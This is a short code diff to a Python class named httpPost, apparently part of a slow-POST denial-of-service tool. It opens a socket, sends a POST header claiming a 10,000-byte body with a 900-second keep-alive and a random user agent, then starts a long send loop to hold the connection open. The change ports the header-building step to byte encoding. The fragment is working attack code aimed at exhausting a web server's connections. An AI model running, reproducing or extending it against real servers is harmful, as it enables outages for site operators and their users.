@@ -66,15 +66,18 @@ class httpPost(Thread):
 		
     def _send_http_post(self, pause=10):
         global stop_now
+        self.socks.connect((self.host, self.port))
+        post= str(
+                 "POST / HTTP/1.1\r\n"
+                 "Host: %s\r\n"
+                 "User-Agent: %s\r\n"
+                 "Connection: keep-alive\r\n"
+                 "Keep-Alive: 900\r\n"
+                 "Content-Length: 10000\r\n"
+                 "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
+                 (self.host, random.choice(useragents)))
 
-        self.socks.send("POST / HTTP/1.1\r\n"
-                        "Host: %s\r\n"
-                        "User-Agent: %s\r\n"
-                        "Connection: keep-alive\r\n"
-                        "Keep-Alive: 900\r\n"
-                        "Content-Length: 10000\r\n"
-                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
-                        (self.host, random.choice(useragents)))
+        self.socks.send(post.encode("utf-8"))
 
         for i in range(0, 9999):
             if stop_now:
